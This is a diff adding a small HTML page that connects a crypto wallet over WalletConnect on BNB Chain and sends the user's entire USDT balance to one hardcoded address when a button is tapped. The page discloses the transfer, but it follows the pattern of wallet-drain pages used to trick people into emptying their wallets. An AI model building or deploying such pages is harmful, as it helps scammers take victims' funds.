@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Send USDT (BEP-20)</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: #1e1e1e;
+      padding: 2em;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+    }
+    button {
+      background-color: #00cc99;
+      color: white;
+      padding: 1em 2em;
+      border: none;
+      border-radius: 8px;
+      font-size: 1.1em;
+      cursor: pointer;
+      margin-top: 1em;
+    }
+    button:disabled {
+      background-color: #666;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Send All USDT (BEP-20)</h2>
+    <p>Connect your wallet and tap the button to send your full USDT balance to:</p>
+    <p style="word-break: break-all; font-weight: bold;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</p>
+    <button id="connectBtn">Connect Wallet</button>
+    <button id="sendBtn" disabled>Send All</button>
+  </div>
+
+  <script>
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+    const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
+    const usdtAbi = [
+      "function balanceOf(address owner) view returns (uint)",
+      "function transfer(address to, uint value) returns (bool)"
+    ];
+
+    let provider, signer, usdt;
+
+    async function connectWallet() {
+      const walletConnectProvider = new WalletConnectProvider.default({
+        rpc: {
+          56: "https://bsc-dataseed.binance.org/"
+        },
+        chainId: 56
+      });
+
+      await walletConnectProvider.enable();
+      provider = new ethers.providers.Web3Provider(walletConnectProvider);
+      signer = provider.getSigner();
+      usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
+
+      document.getElementById("sendBtn").disabled = false;
+      document.getElementById("connectBtn").textContent = "Connected";
+      document.getElementById("connectBtn").disabled = true;
+    }
+
+    async function sendAllUSDT() {
+      const sender = await signer.getAddress();
+      const balance = await usdt.balanceOf(sender);
+
+      if (balance.isZero()) {
+        alert("You have no USDT to send.");
+        return;
+      }
+
+      const tx = await usdt.transfer(recipient, balance);
+      alert("Transaction sent! Waiting for confirmation...");
+      await tx.wait();
+      alert("Transaction confirmed! USDT sent.");
+    }
+
+    document.getElementById("connectBtn").onclick = connectWallet;
+    document.getElementById("sendBtn").onclick = sendAllUSDT;
+  </script>
+</body>
+</html>
